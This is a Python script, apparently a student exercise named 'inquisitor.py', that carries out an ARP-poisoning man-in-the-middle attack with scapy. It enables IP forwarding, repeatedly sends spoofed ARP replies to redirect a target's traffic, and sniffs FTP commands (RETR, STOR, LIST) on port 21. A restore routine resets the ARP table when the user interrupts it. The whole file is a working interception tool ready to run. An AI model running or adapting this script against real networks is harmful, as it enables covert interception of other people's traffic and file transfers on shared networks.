import sys
import os
import threading
import time
from scapy.all import ARP, send, sniff, Raw, TCP

def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def arp_poison(victim_ip, victim_mac, spoof_ip, attacker_mac):
    poison_pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    send(poison_pkt, verbose=False)

def poison_loop(ip_src, mac_src, ip_target, mac_target, attacker_mac):
    try:
        print("[*] Starting ARP poisoning loop...")
        while True:
            # Trick the target into thinking IP-src is at attacker_mac
            poison_pkt = ARP(op=2, pdst=ip_target, hwdst=mac_target,
                             psrc=ip_src, hwsrc=attacker_mac)
            send(poison_pkt, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] CTRL+C detected. Restoring ARP tables...")
        restore_arp(ip_src, mac_src, ip_target, mac_target)

def restore_arp(ip_src, mac_src, ip_target, mac_target):
    print("[*] Restoring ARP table of the target...")
    # Send real mapping
    send(ARP(op=2, pdst=ip_target, hwdst=mac_target,
             psrc=ip_src, hwsrc=mac_src), count=5, verbose=False)

def sniff_ftp():
    print("[*] Starting packet sniffer (port 21)...")
    def process(packet):
        if packet.haslayer(Raw) and packet.haslayer(TCP):
            payload = packet[Raw].load
            if b'RETR' in payload or b'STOR' in payload or b'LIST' in payload:
                print(f"[FTP] {payload.decode(errors='ignore').strip()}")
    sniff(filter="tcp port 21", prn=process, store=0)

def main():
    if len(sys.argv) != 5:
        print("Usage: sudo python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target>")
        sys.exit(1)

    ip_src = sys.argv[1]
    mac_src = sys.argv[2]
    ip_target = sys.argv[3]
    mac_target = sys.argv[4]

    attacker_mac = os.popen("cat /sys/class/net/eth0/address").read().strip()

    enable_ip_forwarding()

    t1 = threading.Thread(target=poison_loop, args=(ip_src, mac_src, ip_target, mac_target, attacker_mac))
    t2 = threading.Thread(target=sniff_ftp)

    t1.start()
    t2.start()

    t1.join()
    t2.join()

if __name__ == "__main__":
    main()
